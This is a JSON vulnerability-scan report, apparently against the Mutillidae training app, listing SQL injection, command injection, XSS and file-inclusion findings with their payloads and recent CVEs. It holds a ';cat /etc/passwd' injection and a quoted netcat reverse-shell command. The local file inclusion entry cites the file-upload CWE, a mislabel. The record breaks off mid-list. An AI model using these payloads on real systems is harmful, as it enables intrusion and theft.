@@ -1,0 +1,973 @@
+{
+    "total_urls_visited": 166,
+    "vulnerabilities": [
+        {
+            "Vulnerability": "SQL Injection",
+            "num_vulnerabilities": 5,
+            "description": "SQL injection is a code injection technique that attackers use to manipulate databases. It allows attackers to execute malicious SQL statements that can extract sensitive data or modify database contents.",
+            "remediation steps": "1. Use parameterized queries or prepared statements to prevent SQL injection attacks. 2. Validate and sanitize user input to prevent malicious input from reaching the database.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=login.php",
+                    "payload": "' for MySQL"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=add-to-your-blog.php",
+                    "payload": "' for MySQL"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=register.php",
+                    "payload": "' for MySQL"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=view-someones-blog.php",
+                    "payload": "' for MySQL"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=add-to-your-blog.php",
+                    "payload": "' for MySQL"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2023-46351",
+                    "descriptions": [
+                        "In the module mib < 1.6.1 from MyPresta.eu for PrestaShop, a guest can perform SQL injection. The methods `mib::getManufacturersByCategory()` has sensitive SQL calls that can be executed with a trivial http call and exploited to forge a SQL injection."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2023-43985",
+                    "descriptions": [
+                        "SunnyToo stblogsearch up to v1.0.0 was discovered to contain a SQL injection vulnerability via the StBlogSearchClass::prepareSearch component."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2024-0705",
+                    "descriptions": [
+                        "The Stripe Payment Plugin for WooCommerce plugin for WordPress is vulnerable to SQL Injection via the 'id' parameter in all versions up to, and including, 3.7.9 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database."
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/89.html"
+        },
+        {
+            "Vulnerability": "Command Injection",
+            "num_vulnerabilities": 1,
+            "description": "Command injection is an attack in which an attacker can execute arbitrary commands on the server. This can lead to unauthorized access, data leakage, and system compromise.",
+            "remediation steps": "1. Use whitelisting to restrict the set of allowed commands and parameters. 2. Implement proper input validation and sanitization to prevent command injection vulnerabilities.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=dns-lookup.php",
+                    "payload": ";cat /etc/passwd"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2024-0778",
+                    "descriptions": [
+                        "** UNSUPPORTED WHEN ASSIGNED ** A vulnerability, which was classified as critical, has been found in Uniview ISC 2500-S up to 20210930. Affected by this issue is the function setNatConfig of the file /Interface/DevManage/VM.php. The manipulation of the argument natAddress/natPort/natServerPort leads to os command injection. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251696. NOTE: This vulnerability only affects products that are no longer supported by the maintainer. NOTE: Vendor was contacted early and confirmed immediately that the product is end-of-life. It should be retired and replaced."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2023-49329",
+                    "descriptions": [
+                        "Anomali Match before 4.6.2 allows OS Command Injection. An authenticated admin user can inject and execute operating system commands. This arises from improper handling of untrusted input, enabling an attacker to elevate privileges, execute system commands, and potentially compromise the underlying operating system. The fixed versions are 4.4.5, 4.5.4, and 4.6.2. The earliest affected version is 4.3."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2024-0714",
+                    "descriptions": [
+                        "A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way."
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/78.html"
+        },
+        {
+            "Vulnerability": "Reflected Cross Site Scripting",
+            "num_vulnerabilities": 14,
+            "description": "Reflected Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into a web application, which are then reflected back to the user's browser. This can lead to client-side code execution and various security risks.",
+            "remediation steps": "1. Encode user input to prevent malicious scripts from executing. 2. Implement Content Security Policy (CSP) headers to restrict the sources of executable scripts.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=add-to-your-blog.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=register.php",
+                    "payload": "<scrIpt>alert()</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=add-to-your-blog.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=dns-lookup.php",
+                    "payload": "<scrIpt>alert()</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=set-background-color.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=client-side-control-challenge.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=upload-file.php",
+                    "payload": "<scrIpt>alert()</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php",
+                    "payload": "<scrIpt>alert()</sCriPt>"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=source-viewer.php",
+                    "payload": "<scrIpt>alert('XSS')</sCriPt>"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2024-22160",
+                    "descriptions": [
+                        "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Bradley B. Dalina Image Tag Manager allows Reflected XSS.This issue affects Image Tag Manager: from n/a through 1.5.\n\n"
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2024-22307",
+                    "descriptions": [
+                        "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Lab WP-Lister Lite for eBay allows Reflected XSS.This issue affects WP-Lister Lite for eBay: from n/a through 3.5.7.\n\n"
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2024-23508",
+                    "descriptions": [
+                        "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in bPlugins PDF Poster – PDF Embedder Plugin for WordPress allows Reflected XSS.This issue affects PDF Poster – PDF Embedder Plugin for WordPress: from n/a through 2.1.17.\n\n"
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/79.html"
+        },
+        {
+            "Vulnerability": "Stored Cross Site Scripting",
+            "num_vulnerabilities": 0
+        },
+        {
+            "Vulnerability": "Remote File Inclusion",
+            "num_vulnerabilities": 12,
+            "description": "Remote file inclusion (RFI) is an attack that allows an attacker to include remote files on a website. This can lead to the execution of arbitrary code and unauthorized access to server resources.",
+            "remediation steps": "1. Avoid dynamically including remote files in web applications. 2. Use allow list-based input validation to restrict the inclusion of files.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info-xpath.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=source-viewer.php",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=http://www.google.com",
+                    "payload": "www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=http%3A%2F%2Fwww.google.com%2F&popUpNotificationCode=http%3A%2F%2Fwww.google.com%2F",
+                    "payload": "http://www.google.com/"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=http%3A%2F%2Fwww.google.com%2F",
+                    "payload": "http://www.google.com/"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2024-2150",
+                    "descriptions": [
+                        "A vulnerability, which was classified as critical, has been found in SourceCodester Insurance Management System 1.0. This issue affects some unknown processing. The manipulation of the argument page leads to file inclusion. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-255503."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2023-52325",
+                    "descriptions": [
+                        "A local file inclusion vulnerability in one of Trend Micro Apex Central's widgets could allow a remote attacker to execute arbitrary code on affected installations.\r\n\r\nPlease note: this vulnerability must be used in conjunction with another one to exploit an affected system. In addition, an attacker must first obtain a valid set of credentials on target system in order to exploit this vulnerability."
+                    ]
+                },
+                {
+                    "cve_id": "CVE-2024-0728",
+                    "descriptions": [
+                        "A vulnerability classified as problematic was found in ForU CMS up to 2020-06-23. Affected by this vulnerability is an unknown functionality of the file channel.php. The manipulation of the argument c_cmodel leads to file inclusion. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-251551."
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/610.html"
+        },
+        {
+            "Vulnerability": "Local File Inclusion",
+            "num_vulnerabilities": 11,
+            "description": "Local file inclusion (LFI) is a type of vulnerability that allows an attacker to include files on a server through the web browser. This can lead to information disclosure and remote code execution.",
+            "remediation steps": "1. Avoid passing user-controlled input directly to file inclusion functions. 2. Implement proper input validation and sanitize file paths to prevent LFI vulnerabilities.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info-xpath.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=source-viewer.php",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=%2Fetc%2Fpasswd&popUpNotificationCode=%2Fetc%2Fpasswd",
+                    "payload": "/etc/passwd"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=%2Fetc%2Fpasswd",
+                    "payload": "/etc/passwd"
+                }
+            ],
+            "recent_cves": [
+                {
+                    "cve_id": "CVE-2024-1644",
+                    "descriptions": [
+                        "Suite CRM version 7.14.2 allows including local php files. This is possible\n\nbecause the application is vulnerable to LFI.\n\n\n\n"
+                    ]
+                }
+            ],
+            "cwe_link": "https://cwe.mitre.org/data/definitions/434.html"
+        },
+        {
+            "Vulnerability": "Verb Tampering",
+            "num_vulnerabilities": 153,
+            "description": "Verb tampering is a type of attack that involves modifying HTTP request methods (verbs) to bypass security controls or access unauthorized resources.",
+            "remediation steps": "1. Use secure HTTP methods (e.g., GET, POST) and avoid using less common methods. 2. Implement access controls and proper authorization mechanisms to restrict access to sensitive resources.",
+            "vulnerabilities": [
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=home.php&popUpNotificationCode=HPH0",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=login.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?popUpNotificationCode=L1H2&page=/owaspbwa/mutillidae-git/home.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/set-up-database.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=captured-data.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=add-to-your-blog.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=register.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=sqlmap-targets.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=view-someones-blog.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=pen-test-tool-lookup.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=pen-test-tool-lookup-ajax.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-user-account.php",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=add-to-your-blog.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=dns-lookup.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=text-file-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-info-xpath.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=set-background-color.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=html5-storage.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=capture-data.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=document-viewer.php&PathToDocument=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=arbitrary-file-inclusion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-poll.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=back-button-discussion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=styling-frame.php&page-to-frame=styling.php%3Fpage-title%3DStyling+with+Mutillidae",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=password-generator.php&username=anonymous",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=site-footer-xss-discussion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-lookup-dns-record.php",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=repeater.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=view-user-privilege-level.php&iv=6bc24fc1ab650b25b4114e93a98f1eba",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=xml-validator.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=source-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=privilege-escalation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=credits.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=secret-administrative-pages.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=directory-browsing.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=user-agent-impersonation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=upload-file.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=phpmyadmin.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=robots-txt.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=framing.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/framer.html",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=credits.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=ssl-misconfiguration.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=text-file-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/?page=source-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-hello-world.php",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=framer.html",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=documentation/change-log.html",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=installation.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=documentation/vulnerabilities.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=hackers-for-charity.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=usage-instructions.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=/owaspbwa/mutillidae-git/home.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=./documentation/vulnerabilities.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/index.php?page=php-errors.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=home.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=login.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=1",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=10",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=11",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=12",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=13",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=48",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=show-log.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=captured-data.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=user-info.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=30",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=add-to-your-blog.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=14",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=register.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=sqlmap-targets.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=view-someones-blog.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=pen-test-tool-lookup.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=26",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=pen-test-tool-lookup-ajax.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-user-account.php?wsdl",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=browser-info.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=18",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=dns-lookup.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=20",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=text-file-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=16",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=39",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=40",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=user-info-xpath.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=49",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=set-background-color.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=33",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=html5-storage.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=23",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=capture-data.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=document-viewer.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=21",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=41",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=arbitrary-file-inclusion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=user-poll.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=back-button-discussion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=19",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=styling-frame.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=50",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=password-generator.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=site-footer-xss-discussion.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/webservices/soap/ws-lookup-dns-record.php?wsdl",
+                    "payload": "PUT"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=repeater.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=31",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=32",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=view-user-privilege-level.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=xml-validator.php",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/level-1-hints-page-wrapper.php?level1HintIncludeFile=36",
+                    "payload": "POST"
+                },
+                {
+                    "url": "http://192.168.232.135:80/mutillidae/includes/pop-up-help-context-generator.php?pagename=source-viewer.php",
+                    "payload": "POST"
+                },
+                {
